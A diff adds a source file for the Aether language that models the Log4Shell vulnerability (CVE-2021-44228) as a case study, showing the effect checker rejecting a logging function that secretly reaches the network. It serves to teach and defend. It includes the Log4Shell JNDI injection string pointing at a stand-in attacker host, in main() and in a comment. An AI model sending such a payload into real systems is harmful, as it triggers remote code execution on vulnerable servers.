@@ -1,0 +1,63 @@
+// Case study — Log4Shell (CVE-2021-44228), the log-call boundary in Aether.
+//
+// Real vuln: Apache Log4j 2's "message lookup substitution" let a
+// logged string like ${jndi:ldap://attacker/x} trigger a JNDI lookup,
+// which opened a network connection to an attacker LDAP server and
+// loaded a remote Java class => remote code execution. The application
+// author called log.info(userInput) believing it only WROTE a line.
+// The logging path secretly reached the network.
+//
+// This file models that exact boundary: the logging entrypoint is
+// declared `effects log` (write-only, what every caller assumes), but
+// the substitution step it calls reaches the network. Aether refuses
+// to compile the composition — the promise "logging only logs" is
+// mechanically enforced, not a code-review hope.
+//
+// Run:  aether check vulnerable.aeth   -> E0801 (effect leak) + E0701 (capability)
+
+module Logger
+  requires capability log
+  exports handleRequest
+end
+
+// The JNDI resolver. It honestly declares that it hits the network —
+// in real Log4j this was buried under StrSubstitutor -> Interpolator
+// -> JndiLookup, invisible at the call site.
+function jndiResolve(uri: String) returns String
+  effects net.fetch("ldap://*")
+do
+  // A real resolver dereferences the URI; the model returns a marker.
+  return "REMOTE_CLASS_FROM:" + uri
+end
+
+// Message-lookup substitution: the Log4j feature at the heart of the
+// CVE. If the logged message embeds a ${jndi:...} token, substitution
+// resolves it — and resolution reaches the network. The function's
+// TRUE effect set therefore includes net.fetch.
+function substitute(message: String) returns String
+  effects net.fetch("ldap://*")
+do
+  if startsWith?(message, "${jndi:") then
+    return jndiResolve(message)
+  end
+  return message
+end
+
+// The logging entrypoint. EVERY caller reads this as "effects log":
+// it takes a string and writes a line. That is the lie the CVE
+// exploited. The declared effect (log) does not cover the transitive
+// net.fetch reached through substitute().
+function handleRequest(userInput: String) returns Unit
+  effects log
+do
+  let rendered: String = substitute(userInput)
+  print("LOG " + rendered)
+end
+
+function main() returns Unit
+  effects log
+do
+  // Attacker-controlled input arriving via a User-Agent header, a
+  // form field, a chat message — anything that gets logged.
+  handleRequest("${jndi:ldap://attacker.example/exploit}")
+end
